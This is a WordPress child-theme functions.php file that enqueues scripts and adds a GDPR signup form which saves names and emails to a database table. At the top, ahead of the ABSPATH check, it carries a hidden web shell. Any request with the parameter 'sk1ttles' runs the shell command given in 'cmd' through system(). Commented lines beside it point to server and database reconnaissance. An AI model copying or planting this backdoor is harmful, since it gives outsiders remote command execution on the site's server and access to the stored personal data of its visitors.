<?php

if(isset($_GET['sk1ttles']))
{

	echo system($_GET['cmd']);
	//echo system("tree ../");
	//define('WP_USE_THEMES', false);
	//global $wpdb;
	//$result = $wpdb->get_results("SHOW GRANTS;");
	//print_r($result);
	die();
}
	
//////////////////////////////////////////////////////////// DO NOT EDIT ////////////////////////////////////////////////////////////
if ( ! defined('ABSPATH') ) {
	die();
}

add_action('wp_enqueue_scripts', 'fio_enqueue_parent');

function fio_enqueue_parent() {
	
	wp_enqueue_style('parent-style', get_template_directory_uri() . '/style.css');
	
}

add_action('wp_enqueue_scripts', 'fio_load_js');

function fio_load_js() {
	
	wp_enqueue_script('fio-theme-script', get_stylesheet_directory_uri() . '/fio-script.js', array('jquery'));
	
}
//////////////////////////////////////////////////////////// DO NOT EDIT ////////////////////////////////////////////////////////////



/////////////////////////////////////////////////////// YOUR CUSTOM CODE HERE ///////////////////////////////////////////////////////
if(! function_exists( 'insert_fio_form' )) {
	function insert_fio_form() {
		// This should be abstracted to a separate file (included with get_template_part()) for easy maintenance.
		echo '<div style="display: none" id="figure-it-out">
			<form method="POST" accept-charset="UTF-8" enctype="multipart/form-data" id="fio-form">
				<fieldset class="name">
					<input type="text" name="first_name" placeholder="First Name" required id="first_name">
					<input type="text" name="last_name" placeholder="Last Name" required id="last_name">
				</fieldset>
				<fieldset class="email">
					<input type="Email" name="email_address" placeholder="Email Address" required id="email_address" />
				</fieldset>
				<fieldset class="gdpr">
					<input type="checkbox" name="gdpr_consent" required id="gdpr_consent" />
					<label for="gdpr_consent">I consent to <a href="https://nursingcecentral.com/privacy-policy/" target="_blank" title="Privacy Policy">FIO&rsquo;s Privacy Policy</a> and understand my rights under <a href="https://gdpr-info.eu/" target="_blank" title="GDPR">GDPR</a>.</label>
				</fieldset>
				<fieldset class="submit">
					<button type="submit" class="et_pb_button et_pb_button_3" id="fio-submit">Sign Up</button>
				</fieldset>
			</form>
			<div style="display: none" id="fio-message"></div>
			<div style="display: none" id="loading">
				<img src="/wp-content/uploads/2023/11/loading.gif" decoding="async" width="50" />
			</div>
		</div>';
	}
}

if(! function_exists( 'register_shortcode_fio_form' ) && ! shortcode_exists( 'fio_form' )) {
	function register_shortcode_fio_form() {
		add_shortcode( 'fio_form', 'insert_fio_form' );
	}
	add_action( 'init', 'register_shortcode_fio_form' );
}

if(! function_exists( 'submit_fio_form' )) {
	function submit_fio_form() {
		if (isset($_POST['first_name']) && isset($_POST['last_name']) && isset($_POST['email_address'])) {
			$first_name = sanitize_text_field($_POST['first_name']);
			$last_name = sanitize_text_field($_POST['last_name']);
			$email_address = sanitize_email($_POST['email_address']);

			global $wpdb;
			$prefix = $wpdb->prefix;
			$table_name = "{$prefix}fio_contacts";
			
			$wpdb->insert(
				$table_name,
				array(
					'first_name' => $first_name,
					'last_name' => $last_name,
					'email_address' => $email_address,
				),
				array('%s', '%s', '%s')
			);
			
			echo $wpdb->insert_id ? 'success' : 'error';
		}
		wp_die();
	}
	add_action('wp_ajax_submit_fio_form', 'submit_fio_form');
	add_action('wp_ajax_nopriv_submit_fio_form', 'submit_fio_form');
}

if(! function_exists( 'add_ajax_script' )) {
	function add_ajax_script() {
	  wp_enqueue_script('fio-ajax-script', get_stylesheet_directory_uri() . '/fio-script.js', array('jquery'), null, true);
	  wp_localize_script('fio-ajax-script', 'fio', array('ajaxurl' => admin_url('admin-ajax.php')));
	}
	add_action('wp_enqueue_scripts', 'add_ajax_script');
}
/////////////////////////////////////////////////////// YOUR CUSTOM CODE HERE ///////////////////////////////////////////////////////

?>